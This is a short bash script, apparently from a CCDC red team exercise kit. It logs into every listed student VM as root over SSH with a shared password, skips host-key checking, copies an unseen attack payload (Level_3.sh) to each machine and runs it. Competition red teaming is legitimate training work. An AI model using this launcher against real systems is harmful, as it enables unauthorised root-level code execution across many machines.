#!/bin/bash
# CCDC Red Team - deploy Level 3 to all student VMs over SSH (root login).
# Run ON THE RED TEAM VM (192.168.4.241).
#   ./deploy_level3.sh
# Pushes Level_3.sh to each target and runs it as root.

set -uo pipefail
LEVEL=3

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SELF_DIR/targets.conf"

# Locate the payload whether run from the repo or from /opt/ccdc.
if [ -z "${ATTACK_DIR:-}" ]; then
    for cand in "$SELF_DIR/../attacks" "$SELF_DIR/../Attacks" /opt/ccdc/attacks; do
        [ -f "$cand/Level_${LEVEL}.sh" ] && ATTACK_DIR="$cand" && break
    done
fi
SCRIPT="${ATTACK_DIR:-}/Level_${LEVEL}.sh"

command -v sshpass >/dev/null 2>&1 || { echo "sshpass not installed - run install_all.sh first"; exit 1; }
[ -f "$SCRIPT" ] || { echo "Payload not found: Level_${LEVEL}.sh (looked in $ATTACK_DIR)"; exit 1; }

# Lab options: skip host-key prompts, force password auth, short timeout.
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
-o PubkeyAuthentication=no -o PreferredAuthentications=password -o ConnectTimeout=10"

for ip in "${TARGETS[@]}"; do
    echo "[*] Level $LEVEL -> $ip"
    if sshpass -p "$SSH_PASS" scp $SSH_OPTS "$SCRIPT" root@"$ip":/tmp/ \
       && sshpass -p "$SSH_PASS" ssh $SSH_OPTS root@"$ip" "bash /tmp/Level_${LEVEL}.sh"; then
        echo "[+] $ip done"
    else
        echo "[!] $ip FAILED"
    fi
done
